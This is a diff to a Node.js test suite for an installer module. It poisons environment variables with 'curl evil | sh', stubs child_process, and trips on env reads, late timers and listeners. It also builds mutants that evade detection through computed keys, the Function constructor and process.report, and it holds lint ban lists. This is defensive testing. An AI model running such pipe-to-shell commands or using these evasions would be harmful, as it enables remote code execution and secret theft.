@@ -43,9 +43,24 @@ const SNAPSHOT = (file, dir) => [
 const POISON = { PLX_CMD: 'curl evil | sh', GHOSTTY_DOCK_INSTALL: 'curl evil | sh', INSTALL_COMMAND: 'curl evil | sh', HOME: '/evil', PATH: '/evil', SHELL: '/evil/sh', TMPDIR: '/evil' };
 const SPAWNERS = ['execFile', 'spawn', 'exec', 'fork', 'execSync', 'execFileSync', 'spawnSync'];
 
+const TIMERS = ['setTimeout', 'setInterval', 'setImmediate'];
+const realTimers = Object.fromEntries(TIMERS.map((k) => [k, globalThis[k]]));
+const ALLOWED_MODULES = ['node:child_process', 'node:fs', 'node:os', 'node:path'];
+const LINT_BANNED = [/process\.env/, /\benv\b/, /process\s*\[/, /globalThis/, /\bReflect\b/, /\beval\s*\(/, /\bFunction\s*\(/,
+  /\bmodule\s*\.\s*require\b/, /\bimport\b/, /\.\s*constructor\s*\(/, /\bisProxy\b/, /\breport\b|getReport/, /\bFinalizationRegistry\b/];
+const counts = (names) => names.reduce((m, n) => ({ ...m, [n]: (m[n] || 0) + 1 }), {});
+const grew = (before, after) => Object.keys(after).filter((k) => after[k] > (before[k] || 0));
+const listeners = () => Object.fromEntries(process.eventNames().map((n) => [String(n), process.listenerCount(n)]));
+
+// Out of scope: a module that detects it is under test (util.types.isProxy,
+// NODE_TEST_CONTEXT, a stubbed execFile, --test in argv…) and only misbehaves
+// outside it. No test can rule that out; review of src/ghostty-dock-install.js
+// is the guard, and the lint below only raises the cost.
+
 // Loads `srcFile` fresh with child_process stubbed and the env poisoned, then
-// writes and "opens" a script in a temp folder. Returns what failed.
-async function check(srcFile) {
+// writes and "opens" a script in a temp folder. Returns what failed. `seen`
+// receives the env keys read, for the tests only: problems never name keys.
+async function check(srcFile, seen = {}) {
   const problems = [];
   const calls = [];
   const saved = Object.fromEntries(SPAWNERS.map((k) => [k, cp[k]]));
@@ -55,7 +70,7 @@ async function check(srcFile) {
     cp[k] = (...args) => {
       calls.push([k, args[0], args[1]]);
       const cb = args.find((a) => typeof a === 'function');
-      if (cb) setImmediate(() => cb(null, '', ''));
+      if (cb) realTimers.setImmediate(() => cb(null, '', ''));
       return { on() { return this; }, kill() {}, stdout: null, stderr: null };
     };
   }
@@ -63,15 +78,33 @@ async function check(srcFile) {
   // Tripwire: the module needs no environment at all, so any read while it
   // loads, builds the script and launches fails, whatever syntax reached it
   // (computed keys, descriptors, Function/vm strings, ESM `import process`).
+  // process.report reads the real environment natively, so it is stubbed too.
+  // Work left behind to run after the tripwire is gone also fails: timers are
+  // recorded and never scheduled (unref'd ones are invisible to
+  // getActiveResourcesInfo), and pending resources and process listeners must
+  // not grow.
   const real = process.env;
-  const reads = new Set();
-  const note = (k) => { reads.add(String(k)); };
+  const reads = [];
+  let enumerated = 0;
+  const reportDesc = Object.getOwnPropertyDescriptor(process, 'report');
+  const scheduled = [];
+  const pendingBefore = counts(process.getActiveResourcesInfo());
+  const listenersBefore = listeners();
   process.env = new Proxy(real, {
-    get(t, k) { note(k); return Reflect.get(t, k); },
-    has(t, k) { note(k); return Reflect.has(t, k); },
-    ownKeys(t) { note('<ownKeys>'); return Reflect.ownKeys(t); },
-    getOwnPropertyDescriptor(t, k) { note(k); return Reflect.getOwnPropertyDescriptor(t, k); },
+    get(t, k) { reads.push(String(k)); return Reflect.get(t, k); },
+    has(t, k) { reads.push(String(k)); return Reflect.has(t, k); },
+    ownKeys(t) { enumerated++; return Reflect.ownKeys(t); },
+    getOwnPropertyDescriptor(t, k) { reads.push(String(k)); return Reflect.getOwnPropertyDescriptor(t, k); },
   });
+  const report = () => { reads.push('<process.report>'); return { environmentVariables: {}, header: {} }; };
+  Object.defineProperty(process, 'report', { configurable: true, get() { reads.push('<process.report>'); return { getReport: report, writeReport: report }; } });
+  const inert = { ref() { return this; }, unref() { return this; }, hasRef() { return false; }, refresh() { return this; }, [Symbol.toPrimitive]() { return 0; } };
+  for (const k of TIMERS) globalThis[k] = () => { scheduled.push(k); return inert; };
+  const untrip = () => {
+    process.env = real;
+    Object.defineProperty(process, 'report', reportDesc);
+    Object.assign(globalThis, realTimers);
+  };
   try {
     delete require.cache[require.resolve(srcFile)];
     const I = require(srcFile);
@@ -80,8 +113,14 @@ async function check(srcFile) {
     if (I.scriptBody(file, path.dirname(file)) !== SNAPSHOT(file, path.dirname(file))) problems.push('scriptBody differs from the snapshot');
     let opened = null;
     const r = await I.launch({ tempDir: root });
-    process.env = real;
-    if (reads.size) problems.push(`read the environment: ${JSON.stringify([...reads])}`);
+    const pending = grew(pendingBefore, counts(process.getActiveResourcesInfo()));
+    const listening = grew(listenersBefore, listeners());
+    untrip();
+    seen.reads = reads;
+    if (reads.length || enumerated) problems.push(`read the environment: ${reads.length} key read(s), enumerated ${enumerated} time(s)`);
+    if (scheduled.length) problems.push(`scheduled ${scheduled.length} timer(s) to run later: ${[...new Set(scheduled)].join(', ')}`);
+    if (pending.length) problems.push(`left work pending after launch: ${pending.join(', ')}`);
+    if (listening.length) problems.push(`added process listeners: ${listening.join(', ')}`);
     if (!r.ok) problems.push(`launch failed: ${r.error}`);
     if (calls.length !== 1) problems.push(`expected one child_process call, got ${JSON.stringify(calls)}`);
     else {
@@ -94,12 +133,16 @@ async function check(srcFile) {
       if (body !== SNAPSHOT(opened, path.dirname(opened))) problems.push('the written script differs from the snapshot');
       if (body.split('\n').filter((l) => l === CMD).length !== 1) problems.push('the command line is not there exactly once');
     }
+    // Lint, not proof: modules are an allow-list reached by literal require().
     const src = fs.readFileSync(srcFile, 'utf8');
     const imports = src.match(/require\(\s*['"`](?:node:)?child_process['"`]\s*\)/g) || [];
     if (imports.length !== 1 || !src.includes("const { execFile } = require('node:child_process');")) problems.push('child_process import is not exactly { execFile }');
-    for (const banned of [/process\.env/, /\benv\b/, /process\s*\[/, /globalThis/, /\bReflect\b/, /\beval\s*\(/, /\bFunction\s*\(/]) if (banned.test(src)) problems.push(`source uses ${banned}`);
+    const literal = [...src.matchAll(/\brequire\('([a-z:_]+)'\)/g)].map((m) => m[1]);
+    const anyRequire = (src.match(/\brequire\b/g) || []).length;
+    if (anyRequire !== literal.length || literal.length !== ALLOWED_MODULES.length || [...literal].sort().join() !== ALLOWED_MODULES.join()) problems.push(`modules are not exactly ${ALLOWED_MODULES.join(', ')} by literal require`);
+    for (const banned of LINT_BANNED) if (banned.test(src)) problems.push(`source uses ${banned}`);
   } finally {
-    process.env = real;
+    untrip();
     Object.assign(cp, saved);
     for (const k of Object.keys(process.env)) if (!(k in env)) delete process.env[k];
     Object.assign(process.env, env);
@@ -151,16 +194,26 @@ test('the source check also catches env reads that avoid process.env', async () 
   } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
 });
 
-const READ = (problems) => problems.find((p) => p.startsWith('read the environment: '));
+const BEHAVIOUR = /^(read the environment|scheduled \d+ timer|left work pending|added process listeners)/;
 // PLX_INSTALL_X is not in POISON and is unset during check(), so the snapshot
 // cannot fail on these: only the tripwire can catch them.
 const X = 'PLX_INSTALL_X';
+const E = `process['e' + 'nv'].${X}`;
 const TRIP_FORMS = {
   computedDestructure: `(() => { const { ['e' + 'nv']: e } = process; return e.${X}; })()`,
   requireBracket: `require('node:process')['e' + 'nv'].${X}`,
   descriptor: `Object.getOwnPropertyDescriptor(process, 'e' + 'nv').value.${X}`,
   functionCtor: `(() => {}).constructor('return proc' + 'ess.e' + 'nv')().${X}`,
+  report: `process.report.getReport().environmentVariables.${X}`,
 };
+// Reads that would land after launch() returns and the tripwire is gone.
+const LATE_FORMS = {
+  lateTimeout: { expr: `void setTimeout(() => ${E}, 20)`, want: /^scheduled \d+ timer\(s\) to run later: setTimeout$/ },
+  lateUnrefTimeout: { expr: `void setTimeout(() => ${E}, 20).unref()`, want: /^scheduled \d+ timer\(s\) to run later: setTimeout$/ },
+  doubleImmediate: { expr: `void setImmediate(() => setImmediate(() => ${E}))`, want: /^scheduled \d+ timer\(s\) to run later: setImmediate$/ },
+  beforeExit: { expr: `void process.once('beforeExit', () => ${E})`, want: /^added process listeners: beforeExit$/ },
+};
+const at = (expr) => (s) => s.replace('    INSTALL_COMMAND,\n', `    (${expr}) || INSTALL_COMMAND,\n`);
 
 // A file in ESM syntax that require() loads (Node 22). The comment spoofs the
 // lint's exact-import check; child_process is reached through the default
@@ -183,20 +236,68 @@ function esmMutant() {
   return { file, dir };
 }
 
-test('tripwire: the real module reads nothing from process.env', async () => {
-  for (let i = 0; i < 3; i++) assert.equal(READ(await check(SRC)), undefined);
+test('tripwire: the real module reads no env, schedules nothing and adds no listeners', async () => {
+  for (let i = 0; i < 3; i++) {
+    const seen = {};
+    assert.deepEqual(await check(SRC, seen), []);
+    assert.deepEqual(seen.reads, []);
+  }
 });
 
 test('tripwire: env reads the regex cannot see are caught by behaviour', async () => {
   delete process.env[X];
-  const ms = Object.entries(TRIP_FORMS).map(([name, expr]) => ({ name, ...mutant(name, (s) => s.replace('    INSTALL_COMMAND,\n', `    (${expr}) || INSTALL_COMMAND,\n`)) }));
+  const ms = Object.entries(TRIP_FORMS).map(([name, expr]) => ({ name, ...mutant(name, at(expr)) }));
   ms.push({ name: 'esmImportProcess', ...esmMutant() });
   try {
     for (const m of ms) {
-      const p = await check(m.file);
-      const hit = READ(p);
-      assert.ok(hit && hit.includes(X), `${m.name}: ${JSON.stringify(p)}`);
+      const seen = {};
+      const p = await check(m.file, seen);
+      const want = m.name === 'report' ? '<process.report>' : X;
+      assert.ok(seen.reads.includes(want) && p.some((x) => /^read the environment: \d+ key read\(s\), enumerated \d+ time\(s\)$/.test(x)), `${m.name}: ${JSON.stringify(p)}`);
       assert.ok(!p.some((x) => /snapshot/.test(x)), `${m.name} should only be caught by the tripwire: ${JSON.stringify(p)}`);
     }
   } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
+});
+
+test('tripwire: work left to read env after launch returns is caught', async () => {
+  delete process.env[X];
+  const ms = Object.entries(LATE_FORMS).map(([name, f]) => ({ name, want: f.want, ...mutant(name, at(f.expr)) }));
+  try {
+    for (const m of ms) {
+      const p = await check(m.file);
+      assert.ok(p.some((x) => m.want.test(x)), `${m.name}: ${JSON.stringify(p)}`);
+      assert.ok(!p.some((x) => /snapshot|read the environment/.test(x)), `${m.name} is caught for what it left behind: ${JSON.stringify(p)}`);
+    }
+  } finally { for (const m of ms) fs.rmSync(m.dir, { recursive: true, force: true }); }
+});
+
+test('problems give counts, never env key names', async () => {
+  const m = mutant('enumerate', at(`Object.keys(process['e' + 'nv']).length && ''`));
+  try {
+    const p = await check(m.file);
+    const hit = p.find((x) => x.startsWith('read the environment: '));
+    assert.match(hit, /^read the environment: \d+ key read\(s\), enumerated [1-9]\d* time\(s\)$/);
+    const text = p.join('\n');
+    const named = [...Object.keys(process.env), ...Object.keys(POISON)].filter((k) => k.length >= 3 && new RegExp(`\\b${k.replace(/[^\w]/g, '\\$&')}\\b`).test(text));
+    assert.deepEqual(named, [], 'no env key name appears in the problems');
+  } finally { fs.rmSync(m.dir, { recursive: true, force: true }); }
+});
+
+test('lint: modules are an allow-list by literal require; escape hatches are banned', async () => {
+  const cases = {
+    extraModule: [(s) => s.replace("const os = require('node:os');", "const os = require('node:os');\nconst vm = require('node:vm');"), /^modules are not exactly/],
+    computedRequire: [(s) => s.replace("require('node:os')", "require('node:' + 'os')"), /^modules are not exactly/],
+    moduleRequire: [(s) => s.replace("require('node:os')", "module.require('node:os')"), /module\\s\*\\.\\s\*require/],
+    dynamicImport: [(s) => s.replace("const REPO_URL", "void import('node:os');\nconst REPO_URL"), /bimport/],
+    ctor: [at("(() => {}).constructor('return 1')() && ''"), /constructor/],
+    isProxy: [at("require('node:util').types.isProxy({}) && ''"), /isProxy/],
+    report: [at(TRIP_FORMS.report), /report/],
+  };
+  for (const [name, [edit, want]] of Object.entries(cases)) {
+    const m = mutant(`lint-${name}`, edit);
+    try {
+      const p = await check(m.file);
+      assert.ok(p.some((x) => want.test(x)), `${name}: ${JSON.stringify(p)}`);
+    } finally { fs.rmSync(m.dir, { recursive: true, force: true }); }
+  }
 });
